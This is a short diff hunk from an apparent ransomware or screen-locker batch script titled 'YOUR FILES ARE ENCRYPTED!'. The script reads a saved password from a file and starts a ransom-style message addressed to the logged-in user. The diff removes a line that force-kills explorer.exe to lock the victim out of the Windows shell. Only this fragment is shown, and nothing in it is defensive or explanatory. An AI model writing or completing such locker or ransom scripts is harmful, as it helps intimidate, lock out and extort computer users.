@@ -5,8 +5,6 @@ title YOUR FILES ARE ENCRYPTED!
 cd saved
 set /p FINALPASSWORD=<password.txt
 cd ..
-
-taskkill /f /im explorer.exe
 cls
 echo.
 echo Hello %USERNAME%,
